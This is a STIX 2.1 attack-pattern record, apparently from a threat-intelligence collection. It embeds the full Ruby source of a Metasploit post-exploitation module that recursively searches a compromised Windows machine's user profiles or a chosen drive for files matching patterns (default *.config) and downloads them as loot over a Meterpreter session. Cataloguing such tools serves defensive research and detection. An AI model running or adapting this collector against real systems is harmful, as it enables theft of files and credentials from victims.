{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b15d7a71-a342-4f4a-be8b-f131d76606af",
    "created": "2024-08-14T16:33:05.055364Z",
    "modified": "2024-08-14T16:33:05.055368Z",
    "name": "Windows Gather Generic File Collection",
    "description": " This module downloads files recursively based on the FILE_GLOBS option.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_files.rb",
            "external_id": "enum_files.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::Version\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Generic File Collection',\n        'Description' => %q{\n          This module downloads files recursively based on the FILE_GLOBS option.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          '3vi1john <Jbabio[at]me.com>',\n          'RageLtMan <rageltman[at]sempervictus>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\\\']),\n        OptString.new('FILE_GLOBS', [ true, 'The file pattern to search for in a filename', '*.config'])\n      ]\n    )\n  end\n\n  def download_files(location, file_type)\n    sysdriv = client.sys.config.getenv('SYSTEMDRIVE')\n    profile_path_old = sysdriv + '\\\\Documents and Settings\\\\'\n    profile_path_new = sysdriv + '\\\\Users\\\\'\n\n    version = get_version_info\n    if location\n      print_status(\"Searching #{location}\")\n      getfile = client.fs.file.search(location, file_type, true, -1)\n\n    elsif version.build_number < Msf::WindowsVersion::Vista_SP0\n      print_status(\"Searching #{profile_path_old} through windows user profile structure\")\n      getfile = client.fs.file.search(profile_path_old, file_type, true, -1)\n    else\n      # For systems such as: Windows 7|Windows Vista|2008\n      print_status(\"Searching #{profile_path_new} through windows user profile structure\")\n      getfile = client.fs.file.search(profile_path_new, file_type, true, -1)\n    end\n\n    getfile.each do |file|\n      filename = \"#{file['path']}\\\\#{file['name']}\"\n      data = read_file(filename)\n      print_status(\"Downloading #{file['path']}\\\\#{file['name']}\")\n      p = store_loot('host.files', 'application/octet-stream', session, data, file['name'], filename)\n      print_good(\"#{file['name']} saved as: #{p}\")\n    end\n  end\n\n  def run\n    # When the location is set, make sure we have a valid path format\n    location = datastore['SEARCH_FROM']\n    if location && location !~ (%r{^([a-z]):[\\\\|/].*}i)\n      print_error(\"Invalid SEARCH_FROM option: #{location}\")\n      return\n    end\n\n    # When the location option is set, make sure we have a valid drive letter\n    my_drive = ::Regexp.last_match(1)\n    drives = get_drives\n    if location && !drives.include?(my_drive)\n      print_error(\"#{my_drive} drive is not available, please try: #{drives.inspect}\")\n      return\n    end\n\n    datastore['FILE_GLOBS'].split(',').each do |glob|\n      download_files(location, glob.strip)\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      if e.message =~ /The device is not ready/\n        print_error(\"#{my_drive} drive is not ready\")\n        next\n      elsif e.message =~ /The system cannot find the path specified/\n        print_error('Path does not exist')\n        next\n      else\n        raise e\n      end\n    end\n\n    print_status('Done!')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}